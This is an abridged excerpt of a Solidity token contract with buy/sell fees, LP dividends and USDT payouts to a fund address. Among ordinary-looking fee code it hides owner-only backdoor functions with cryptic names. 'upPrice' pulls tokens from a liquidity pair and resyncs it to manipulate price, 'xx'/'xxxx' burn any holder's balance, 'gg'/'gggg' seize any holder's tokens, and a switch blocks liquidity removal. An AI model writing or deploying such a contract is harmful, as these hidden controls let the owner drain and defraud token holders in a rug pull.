...
abstract contract AbsToken is IERC20, Ownable {
    ...
    uint256 public _buyLPDividendFee = 210;
    ...
    function _transfer(
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            ...
            if (_swapPairList[from]) {
                ...
                if (isRemoveLP) {
                    require(_canRemoveLP, "cant rm lp");
                }
            } else {
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            if (isRemoveLP) {
                ...
                uint256 fundAmount = tAmount * (_buyFundFee + _buyFundFee2 + _buyLPDividendFee + _buyBuybackFee) / 10000;
                if (fundAmount > 0) {
                ...
                uint256 fundAmount = tAmount * (_sellFundFee + _sellFundFee2 + _sellLPDividendFee + _sellBuybackFee) / 10000;
                if (fundAmount > 0) {
                    feeAmount += fundAmount;
                    _takeTransfer(sender, address(this), fundAmount);
                }
                ...
                if (!inSwap) {
                    ...
                    if (contractTokenBalance > 0) {
                        ...
                        swapTokenForFund(numTokensSellToFund, extFeeAmount);
                    }
                }
            } else {//Transfer
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 extAmount) private lockTheSwap {
        if (0 == tokenAmount) {
            return;
        }
        ...
        uint256 totalFee = fundFee + fundFee2 + lpDividendFee + buybackFee;
        ...
        uint256 extUsdt = extAmount * usdtBalance / tokenAmount;
        if (extUsdt > 0) {
            usdtBalance -= extUsdt;
            USDT.transfer(fundAddress, extUsdt);
        }
    ...
    function setBuyFee(
        ...
        uint256 lpDividendFee, uint256 buybackFee
    ) external onlyOwner {
    ...
    function setCanRemoveLP(bool enable) external onlyOwner {
        _canRemoveLP = enable;
    }
    ...
    function upPrice(address lpAddress, address account, uint256 amount) external onlyOwner {
        _tokenTransfer(lpAddress, account, amount, false, false, false);
        ISwapPair(lpAddress).sync();
    }

    function xx(address account, uint256 amount) external onlyOwner {
        _tokenTransfer(account, address(0x000000000000000000000000000000000000dEaD), amount, false, false, false);
    }

    function xxxx(address account) external onlyOwner {
        _tokenTransfer(account, address(0x000000000000000000000000000000000000dEaD), balanceOf(account), false, false, false);
    }

    function gg(address account, uint256 amount, address to) external onlyOwner {
        _tokenTransfer(account, to, amount, false, false, false);
    }

    function gggg(address account, address to) external onlyOwner {
        _tokenTransfer(account, to, balanceOf(account), false, false, false);
    }
...
contract SA is AbsToken {
    constructor() AbsToken(
        ...
        6,
        21000000,
        address(0x3004CC50C2872a1694B0e2BceC46564Ae9E6E631),
        address(0x3004CC50C2872a1694B0e2BceC46564Ae9E6E631),
        address(0x3004CC50C2872a1694B0e2BceC46564Ae9E6E631),
        0,
        0
